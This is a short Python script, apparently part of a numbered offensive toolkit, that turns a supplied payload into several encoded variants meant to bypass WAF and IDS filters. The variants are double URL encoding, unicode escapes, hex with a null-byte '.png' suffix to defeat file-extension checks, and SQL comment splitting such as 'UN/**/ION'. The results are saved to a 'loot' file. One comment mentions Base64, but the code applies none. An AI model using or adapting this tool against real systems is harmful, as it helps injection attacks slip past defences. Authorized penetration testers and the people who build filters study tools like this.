import sys
import urllib.parse
import base64

def transform_payload(payload):
    """
    Applies multi-stage encoding to bypass signature-based WAF/IDS rules.
    """
    print(f"[*] Original Payload: {payload}")
    print("-" * 60)

    # 1. Double URL Encoding (Commonly bypasses filters that only decode once)
    double_url = urllib.parse.quote(urllib.parse.quote(payload))
    
    # 2. Unicode Escape (Bypasses keyword-based regex like <script>)
    unicode_enc = "".join([f"\\u{ord(c):04x}" for c in payload])
    
    # 3. Hex-Encoding with Null-Byte Injection (Bypasses file-extension checks)
    hex_null = "".join([f"%{ord(c):02x}" for c in payload]) + "%00.png"

    # 4. Base64 + Comment Injection (For SQLi bypasses)
    # Example: UNION/**/SELECT becomes Base64
    sqli_bypass = payload.replace(" ", "/**/").replace("UNION", "UN/**/ION")
    
    print(f"[+] DOUBLE_URL:     {double_url}")
    print(f"[+] UNICODE_ESCAPE: {unicode_enc}")
    print(f"[+] NULL_BYTE_HEX:  {hex_null}")
    print(f"[+] SQLI_OBFUSCATED: {sqli_bypass}")
    print("-" * 60)

    # Save all variations to loot
    with open("../loot/waf_bypasses.txt", "a") as f:
        f.write(f"Original: {payload}\nURL: {double_url}\nUNI: {unicode_enc}\nHEX: {hex_null}\nSQL: {sqli_bypass}\n\n")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: 129_waf_bypass <raw_payload>")
        sys.exit(1)
    
    transform_payload(sys.argv[1])
